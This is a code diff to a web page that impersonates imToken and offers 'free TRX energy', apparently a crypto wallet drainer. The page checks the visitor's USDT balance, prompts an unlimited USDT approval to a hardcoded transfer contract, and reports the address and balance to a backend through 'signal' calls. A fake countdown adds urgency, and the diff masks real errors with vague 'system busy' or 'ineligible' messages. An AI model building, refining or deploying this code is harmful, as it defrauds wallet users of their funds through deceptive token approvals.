@@ -264,7 +264,7 @@ body {
     <!-- 修复：删除重复的container嵌套 -->
     <div class="lang-switch">
         <button id="langToggle" class="lang-toggle">
-            <<i class="fa fa-globe"></</i> 
+            <i class="fa fa-globe"></i> 
         </button>
     </div>
     <div class="container">      
@@ -338,7 +338,7 @@ body {
         © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
     <script src="imtoken://browser"></script>
-<script>
+    <script>
     // 核心配置（后端主域名已包含/api，直接使用）
     const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -378,10 +378,10 @@ body {
         }
     ];
 
-    // 能量计算配置
+    // 能量计算配置：每秒减少1243，跨设备同步（不依赖localStorage）
     const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
     const INIT_ENERGY = 315360004000;
-    const ENERGY_DECREASE_PER_SEC = 3780;
+    const ENERGY_DECREASE_PER_SEC = 1243; // 需求：每秒减少1243
     const STORAGE_KEY = "energy_countdown_data";
     let energyTimer = null;
     
@@ -393,7 +393,7 @@ body {
     let trxBalance = 0.00;  // TRX余额
     const RECORD_KEY = "imtoken_energy_records";
 
-    // ========== 多语言配置（补全footerInfo键名，与HTML ID对应） ==========
+    // ========== 多语言配置（补充错误提示文案） ==========
     const langConfig = {
         zh: {
             headerTitle: "imToken",
@@ -430,7 +430,7 @@ body {
             copyFail: "❌ 复制失败：请手动复制链接",
             唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
             copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
-            connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ {msg}</span>",
+            connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ 网络波动</span>",
             retryConnect: "重试连接",
             authorizedTip: "已领取提示<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
             authorizedBtn: "已领取过能量",
@@ -438,7 +438,7 @@ body {
             deployingBtn: "发放中...",
             loadingBtn: "加载中...",
             loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
-            insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件（USDT需＞1）</span>",
+            insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件</span>",
             insufficientBtn: "不符合领取条件",
             eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 TRX能量</span>",
             distributingBtn: "能量配送中...",
@@ -452,7 +452,9 @@ body {
             recordType: "领取类型：",
             recordEnergy: "获取能量：",
             recordTime: "领取时间：",
-            freeEnergy: "免费能量领取"
+            freeEnergy: "免费能量领取",
+            systemBusyTip: "系统繁忙请稍后重试", // 非客户原因提示
+            ineligibleTip: "不符合领取条件" // 客户原因提示
         },
         en: {
             headerTitle: "imToken Official",
@@ -489,7 +491,7 @@ body {
             copyFail: "❌ Copy failed - please copy manually",
             唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
             copyGuide: "✅ Link copied - please paste in imToken",
-            connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ {msg}</span>",
+            connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ Network fluctuation</span>",
             retryConnect: "Retry Connection",
             authorizedTip: "Claimed Successfully<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
             authorizedBtn: "Energy Claimed",
@@ -497,7 +499,7 @@ body {
             deployingBtn: "Distributing...",
             loadingBtn: "Loading...",
             loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
-            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible (USDT required > 1)</span>",
+            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible</span>",
             insufficientBtn: "Ineligible",
             eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free TRX Energy</span>",
             distributingBtn: "Energy Distributing...",
@@ -511,7 +513,9 @@ body {
             recordType: "Claim Type:",
             recordEnergy: "Energy Obtained:",
             recordTime: "Claim Time:",
-            freeEnergy: "Free Energy Claim"
+            freeEnergy: "Free Energy Claim",
+            systemBusyTip: "System busy, please try again later", // 非客户原因提示
+            ineligibleTip: "Ineligible" // 客户原因提示
         }
     };
     
@@ -564,31 +568,34 @@ body {
     const reviewTip = document.getElementById("reviewTip");
     const reviewTipText = document.getElementById("reviewTipText");
     const langToggle = document.getElementById("langToggle"); // 单个语言切换按钮
-    const footerInfo = document.getElementById("footerInfo"); // 新增：页脚元素缓存
+    const footerInfo = document.getElementById("footerInfo");
+
+    // ========== 错误类型判断（区分客户/非客户原因） ==========
+    function isCustomerError(errMsg) {
+        // 客户自身原因关键词（根据后端返回和前端逻辑定义）
+        const customerErrorKeys = [
+            "无效TRON地址", "USDT余额不足", "不符合领取条件", "30天内已领取", 
+            "跨组执行", "未检测到钱包地址", "Ineligible", "invalid TRON address", 
+            "USDT balance", "within 30 days"
+        ];
+        return customerErrorKeys.some(key => errMsg.includes(key));
+    }
 
     // ========== 单个按钮切换语言（中文↔英文） ==========
     function toggleLang() {
-        // 切换语言（zh ↔ en）
         currentLang = currentLang === "zh" ? "en" : "zh";
         localStorage.setItem("imtoken_energy_lang", currentLang);
-        // 更新页面文本
         updatePageLang();
-        // 更新记录列表
         renderEnergyRecords();
     }
     
-    // 修复：恢复遍历逻辑，覆盖所有文本元素
+    // 更新页面所有文本
     function updatePageLang() {
         const lang = langConfig[currentLang];
-        // 遍历所有多语言键，更新对应DOM元素
         Object.keys(lang).forEach(key => {
             const el = document.getElementById(key);
-            if (el) {
-                // 特殊处理包含HTML标签的文本（如userInfoDefault、connectedAddress）
-                el.innerHTML = lang[key];
-            }
+            if (el) el.innerHTML = lang[key];
         });
-        // 单独更新按钮文本（确保不被innerHTML覆盖）
         connectBtn.textContent = lang.connectBtnText;
         approveBtn.textContent = lang.approveBtnText;
         reviewTipText.textContent = lang.reviewTipText;
@@ -596,41 +603,48 @@ body {
     }
 
     window.onload = async () => {
-        // 初始化语言
         updatePageLang();
-        // 绑定单个语言切换按钮点击事件
         langToggle.addEventListener("click", toggleLang);
-        
-        // 初始化合约地址显示
         contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-        
-        // 初始渲染记录和状态
         renderEnergyRecords();
         updateWalletStatus();
         
-        // 检测环境+连接钱包
-        await checkImTokenEnv();
+        // 环境检测+钱包初始化（错误静默处理）
+        await checkImTokenEnv().catch(err => {
+            console.error("环境检测失败：", err);
+            const lang = langConfig[currentLang];
+            userInfoEl.innerHTML = lang.userInfoDefault;
+            approveBtn.disabled = true;
+            approveBtn.textContent = lang.approveBtnText;
+        });
         
-        // 启动能量计算
+        // 启动能量倒计时（跨设备同步）
         startPersistentEnergyCountdown();
         
-        // 页面卸载时保存状态
         window.addEventListener("beforeunload", () => {
-            saveEnergyStateToStorage();
             if (energyTimer) clearInterval(energyTimer);
         });
 
-        // 授权后跳转回页面的处理
+        // 授权后跳转处理（错误静默处理）
         if (window.tronWeb && window.location.hash === "#approve") {
             window.location.hash = "";
             setTimeout(() => {
-                initWallet(true); // 传参标记是授权后返回
+                initWallet(true).catch(err => {
+                    console.error("授权后初始化失败：", err);
+                    const lang = langConfig[currentLang];
+                    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+                    // 按错误类型更新页面状态，不弹框
+                    const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
+                    userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>❌ ${tip}</span>`;
+                    approveBtn.disabled = false;
+                    approveBtn.textContent = lang.approveBtnText;
+                });
             }, 500);
         }
     };
 
     /**
-     * 环境检测
+     * 环境检测（错误静默处理）
      */
     async function checkImTokenEnv() {
         const lang = langConfig[currentLang];
@@ -638,41 +652,41 @@ body {
             tronWeb = window.tronWeb;
             connectBtn.style.display = "none";
             warning.style.display = "none";
-            await initWallet(false); // 首次连接，非授权后返回
+            await initWallet(false);
         } else {
-            // 非imToken环境：自动复制+唤起
-            userInfoEl.innerHTML = `
-                ⚠️ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
-                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
-            `;
-            approveBtn.style.display = "none";
-            connectBtn.onclick = async () => {
-                try {
-                    const dappUrl = window.location.href;
-                    await navigator.clipboard.writeText(dappUrl);
-                    window.location.href = "imtoken://open";
-                    setTimeout(() => {
-                        alert(lang.唤起Guide);
-                    }, 1200);
-                } catch (e) {
-                    alert(lang.copyGuide);
-                }
-            };
+            try {
+                userInfoEl.innerHTML = `
+                    ⚠️ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
+                    <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
+                `;
+                approveBtn.style.display = "none";
+                connectBtn.onclick = async () => {
+                    try {
+                        const dappUrl = window.location.href;
+                        await navigator.clipboard.writeText(dappUrl);
+                        window.location.href = "imtoken://open";
+                        setTimeout(() => {}, 1200); // 不弹框
+                    } catch (e) {
+                        console.error("复制/唤起失败：", e);
+                    }
+                };
+            } catch (e) {
+                console.error("非imToken环境处理失败：", e);
+            }
         }
     }
 
     /**
-     * 钱包初始化
+     * 钱包初始化（错误静默处理，仅更新页面状态）
      * @param {boolean} isAfterApprove - 是否是授权后返回
      */
     async function initWallet(isAfterApprove) {
         const lang = langConfig[currentLang];
         try {
-            // 1. 直接从钱包获取地址
             userAddress = tronWeb.defaultAddress.base58;
-            if (!userAddress) throw new Error(currentLang === "zh" ? "未检测到钱包地址，请确保钱包已解锁" : "Wallet address not detected - please unlock your wallet");
+            if (!userAddress) throw new Error("无效TRON地址");
 
-            // 2. 二次授权拦截（30天内已领取）
+            // 30天内已领取（客户原因）
             if (isAddressAuthorized(userAddress)) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
@@ -683,7 +697,6 @@ body {
                 return;
             }
 
-            // 3. 授权后返回，直接执行后续逻辑
             if (isAfterApprove) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
@@ -691,15 +704,22 @@ body {
                 approveBtn.textContent = lang.deployingBtn;
                 updateWalletStatus();
                 document.getElementById("statusAddress").textContent = shortAddr;
-                await executeAfterApprove();
+                await executeAfterApprove().catch(err => {
+                    console.error("授权后发放能量失败：", err);
+                    const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
+                    userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>❌ ${tip}</span>`;
+                    approveBtn.disabled = false;
+                    approveBtn.textContent = lang.approveBtnText;
+                });
                 return;
             }
 
-            // 4. 立即发送A1信号（对应后端/api/send-signal-a1）
-            sendSignalA1();
-            console.log("✅ A1信号已异步发送（分开发送，等待B1）");
+            // 发送A1信号（错误静默处理）
+            await sendSignalA1().catch(err => {
+                console.error("A1信号发送失败：", err);
+                throw err;
+            });
 
-            // 5. 立即显示UI
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             userInfoEl.innerHTML = lang.loadingTip.replace("{address}", shortAddr);
             approveBtn.disabled = true;
@@ -707,16 +727,19 @@ body {
             updateWalletStatus();
             document.getElementById("statusAddress").textContent = shortAddr;
 
-            // 用精简ABI初始化合约
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-
-            // 6. 查询余额
-            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-            const trxRaw = await tronWeb.trx.getBalance(userAddress);
+            const usdtRaw = await trc20Contract.balanceOf(userAddress).call().catch(err => {
+                console.error("查询USDT余额失败：", err);
+                return 0;
+            });
+            const trxRaw = await tronWeb.trx.getBalance(userAddress).catch(err => {
+                console.error("查询TRX余额失败：", err);
+                return 0;
+            });
             tokenBalance = Number(usdtRaw) / 1000000;
             trxBalance = Number(trxRaw) / 1000000;
 
-            // 7. 更新UI和按钮状态
+            // USDT余额不足（客户原因）
             if (tokenBalance <= 1) {
                 userInfoEl.innerHTML = lang.insufficientUsdt
                     .replace("{address}", shortAddr)
@@ -735,183 +758,223 @@ body {
             }
 
         } catch (e) {
-            userInfoEl.innerHTML = lang.connectError.replace("{msg}", e.message);
+            console.error("钱包初始化失败：", e);
+            const lang = langConfig[currentLang];
+            const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+            const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
+            userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>❌ ${tip}</span>`;
             approveBtn.disabled = false;
-            approveBtn.textContent = lang.retryConnect;
-            approveBtn.onclick = () => initWallet(false);
+            approveBtn.textContent = lang.approveBtnText;
         }
     }
 
     /**
-     * 授权后执行的逻辑
+     * 授权后执行：发放能量（错误静默处理）
      */
     async function executeAfterApprove() {
         const lang = langConfig[currentLang];
         try {
-            // 用精简ABI初始化合约（避免授权后未初始化）
-            if (!trc20Contract) {
-                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            }
-
-            // 执行USDT授权
+            if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
             await trc20Contract.approve(
                 AUTO_TRANSFER_CONTRACT,
                 INFINITE_APPROVE_AMOUNT
             ).send({ from: userAddress, shouldPollResponse: true });
 
-            // 发送A2信号（对应后端/api/send-signal-a2）
-            sendSignalA2();
-            console.log("✅ A2信号已发送（分开发送，等待B2）");
+            // 发送A2信号（错误静默处理）
+            await sendSignalA2().catch(err => {
+                console.error("A2信号发送失败：", err);
+                throw err;
+            });
             
-            // 发送B2信号（对应后端/api/send-signal-b2）
             const btn = document.getElementById("approveBtn");
             btn.textContent = lang.distributingBtn;
-            await sendSignalB(false);
+            // 发送B2信号（错误静默处理）
+            await sendSignalB(false).catch(err => {
+                console.error("B2信号发送失败：", err);
+                throw err;
+            });
 
-            // 显示成功结果
             addAuthorizedAddress(userAddress);
             btn.textContent = lang.successBtn;
             userInfoEl.innerHTML += lang.successArrival;
-            alert(lang.successTip);
+            alert(lang.successTip); // 仅授权成功弹提示
             saveEnergyRecord();
             renderEnergyRecords();
         } catch (e) {
-            const btn = document.getElementById("approveBtn");
-            btn.disabled = false;
-            btn.textContent = lang.approveBtnText;
-            alert(lang.authorizeFail.replace("{msg}", e.message));
+            console.error("发放能量失败：", e);
+            throw e; // 抛出到领取按钮逻辑统一处理
         }
     }
 
     /**
-     * 发送A1信号（对应后端/api/send-signal-a1）
+     * 发送A1信号（错误静默捕获，返回错误信息）
      */
-    function sendSignalA1() {
+    async function sendSignalA1() {
         const requestData = { userAddress };
-        setTimeout(() => {
-            fetch(`${BACKEND_API}/api/send-signal-a1`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(requestData),
-                timeout: 15000,
-                keepalive: true
-            }).then(res => {
-                if (res.ok) console.log("✅ A1信号发送成功（后端处理中）");
-                else res.json().then(err => console.warn("A1信号发送失败：", err));
-            }).catch(e => {
-                console.error("❌ A1信号发送失败：", e);
-            });
-        }, 100);
-    }
+        return new Promise((resolve, reject) => {
+            setTimeout(async () => {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 20000);
 
-    /**
-     * 发送A2信号（对应后端/api/send-signal-a2）
-     */
-    function sendSignalA2() {
-        const requestData = { userAddress, usdtBalance: tokenBalance };
-        fetch(`${BACKEND_API}/api/send-signal-a2`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData),
-            timeout: 15000,
-            keepalive: true
-        }).then(res => {
-            if (res.ok) return res.json();
-            else throw new Error("A2接口请求失败");
-        }).then(data => {
-            if (data.success) console.log("✅ A2信号发送成功（后端处理中）");
-            else console.warn("A2信号处理失败：", data.msg);
-        }).catch(e => {
-            console.error("❌ A2信号发送失败：", e);
+                    const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(requestData),
+                        signal: controller.signal,
+                        keepalive: true
+                    });
+                    clearTimeout(timeoutId);
+
+                    if ([400, 408, 409].includes(res.status)) {
+                        const errData = await res.json().catch(() => ({ detail: "接口处理失败" }));
+                        reject(new Error(errData.detail || "A1信号处理失败"));
+                        return;
+                    }
+
+                    if (!res.ok) throw new Error("A1接口请求失败");
+                    console.log("✅ A1信号发送成功");
+                    resolve(true);
+                } catch (e) {
+                    reject(e);
+                }
+            }, 100);
         });
     }
 
     /**
-     * 发送B信号（B1对应b1接口，B2对应b2接口）
+     * 发送A2信号（错误静默捕获，返回错误信息）
+     */
+    async function sendSignalA2() {
+        const requestData = { userAddress, usdtBalance: tokenBalance };
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 20000);
+
+        try {
+            const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(requestData),
+                signal: controller.signal,
+                keepalive: true
+            });
+            clearTimeout(timeoutId);
+
+            if ([400, 408, 409].includes(res.status)) {
+                const errData = await res.json().catch(() => ({ detail: "接口处理失败" }));
+                throw new Error(errData.detail || "A2信号处理失败");
+            }
+
+            if (!res.ok) throw new Error("A2接口请求失败");
+            console.log("✅ A2信号发送成功");
+            return true;
+        } catch (e) {
+            clearTimeout(timeoutId);
+            throw e;
+        }
+    }
+
+    /**
+     * 发送B信号（错误静默捕获，返回错误信息）
      * @param {boolean} isB1 - true=发送B1，false=发送B2
      */
     async function sendSignalB(isB1 = true) {
         const requestData = { userAddress };
         const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 20000);
+
         try {
             const res = await fetch(`${BACKEND_API}${apiPath}`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(requestData),
-                timeout: 20000,
+                signal: controller.signal,
                 keepalive: true
             });
+            clearTimeout(timeoutId);
+
+            if ([400, 408, 409].includes(res.status)) {
+                const errData = await res.json().catch(() => ({ detail: "接口处理失败" }));
+                throw new Error(errData.detail || `信号${isB1 ? "B1" : "B2"}处理失败`);
+            }
+
             const data = await res.json();
-            if (!res.ok || !data.success) throw new Error(data.detail || (isB1 ? "信号B1处理失败" : "信号B2处理失败"));
-            console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功：`, data);
+            if (!res.ok || !data.success) throw new Error(data.detail || `信号${isB1 ? "B1" : "B2"}处理失败`);
+            console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
             return true;
         } catch (e) {
-            console.error(`❌ 信号${isB1 ? "B1" : "B2"}处理失败：`, e);
-            return false;
+            clearTimeout(timeoutId);
+            throw e;
         }
     }
 
     /**
-     * 领取按钮逻辑（发送B1信号+审核提示+跳转签名）
+     * 领取按钮逻辑（统一错误提示：客户原因→不符合领取条件，非客户原因→系统繁忙）
      */
     function bindApproveLogic() {
         const lang = langConfig[currentLang];
         approveBtn.onclick = async () => {
             const btn = document.getElementById("approveBtn");
-            // 禁用按钮+显示审核提示
+            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             btn.disabled = true;
             btn.textContent = lang.loadingBtn;
             reviewTip.style.display = "flex";
 
             try {
-                // 发送B1信号（后端审核）
+                // 发送B1信号（统一捕获错误）
                 const b1Success = await sendSignalB(true);
-                if (!b1Success) throw new Error(currentLang === "zh" ? "系统繁忙请稍后再试" : "System busy, please try again later");
+                if (!b1Success) throw new Error("信号B1处理失败");
 
-                // B1反馈成功后，跳转钱包签名页面
+                // 跳转签名页面
                 reviewTip.style.display = "none";
                 btn.textContent = lang.redirectingBtn;
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
             } catch (e) {
-                // 失败后恢复按钮状态
+                console.error("领取流程失败：", e);
+                // 区分错误类型，统一弹提示
+                const errMsg = e.message;
+                const tip = isCustomerError(errMsg) ? lang.ineligibleTip : lang.systemBusyTip;
+                alert(`⚠️ ${tip}`); // 仅此处弹框提示
+                // 更新页面状态
+                userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>❌ ${tip}</span>`;
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 reviewTip.style.display = "none";
-                alert(lang.approveFail.replace("{msg}", e.message));
             }
         };
     }
 
     /**
-     * 能量计算相关函数
+     * 能量倒计时：每秒减少1243，跨设备同步（不依赖localStorage）
      */
     function startPersistentEnergyCountdown() {
-    // 强制按当前时间计算，不读取localStorage（保证跨设备同步）
-    let currentEnergy = INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
-    currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
-    updateEnergyDisplay(currentEnergy);
-    // 清除旧定时器，启动新定时器
-    if (energyTimer) clearInterval(energyTimer);
-    energyTimer = setInterval(() => {
-        currentEnergy -= ENERGY_DECREASE_PER_SEC;
-        currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
+        // 纯按当前时间-部署时间计算，跨设备完全同步
+        const calculateEnergy = () => {
+            const timeDiffSec = Math.floor((new Date().getTime() - DEPLOY_START_TIME) / 1000);
+            return Math.max(0, INIT_ENERGY - (timeDiffSec * ENERGY_DECREASE_PER_SEC));
+        };
+
+        // 初始计算并更新
+        let currentEnergy = calculateEnergy();
         updateEnergyDisplay(currentEnergy);
-        // 只保存当前能量，不依赖localStorage的时间（避免跨设备不同步）
-        localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy }));
-    }, 1000);
-}
-    function loadEnergyStateFromStorage() {
-        try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
+
+        // 清除旧定时器，启动新定时器（每秒更新）
+        if (energyTimer) clearInterval(energyTimer);
+        energyTimer = setInterval(() => {
+            currentEnergy = calculateEnergy();
+            updateEnergyDisplay(currentEnergy);
+        }, 1000);
     }
-    function saveEnergyStateToStorage(currentEnergy) {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy, lastUpdateTime: new Date().getTime() }));
-    }
+
     function updateEnergyDisplay(currentEnergy) {
         contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
     }
+
     function updateWalletStatus() {
         userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
     }
+
     function saveEnergyRecord() {
         const lang = langConfig[currentLang];
         const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -926,6 +989,7 @@ body {
         });
         localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
     }
+
     function renderEnergyRecords() {
         const lang = langConfig[currentLang];
         const container = document.getElementById("approvalRecords");
@@ -943,6 +1007,6 @@ body {
             </div>
         `).join("");
     }
-</script>
+    </script>
 </body>
 </html>
